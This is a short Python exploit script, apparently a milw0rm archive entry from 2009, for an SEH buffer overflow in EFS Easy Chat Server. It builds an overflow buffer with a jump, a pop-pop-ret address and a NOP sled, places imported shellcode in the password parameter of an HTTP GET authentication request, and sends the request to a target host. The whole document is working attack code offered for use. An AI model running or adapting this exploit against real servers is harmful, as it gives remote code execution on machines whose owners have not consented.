#!/usr/bin/python
#[*] Bug : 	    EFS Easy Chat Server Authentication Request  Buffer Overflow Exploit (SEH)
#[*] Refer :        http://www.milw0rm.com/exploits/4289
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)

from payload import buf
import socket
import sys
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):



	buffer = "\x41"*216
	buffer += "\xEB\x06\xAE\xFA" #jmp+6
	buffer += "\xB6\xB2\x01\x10" #universal pop pop ret
	buffer += "\x90"*19

	# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com


	head  = "GET /chat.ghp?username="+buffer+"&password="+str(buf)+"&room=1 HTTP/1.1\r\n"
	head += "Host: "+target_machine+"\r\n"


	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_machine,target_port))
	s.send(head + "\r\n\r\n")
	s.close()

	# milw0rm.com [2009-03-03]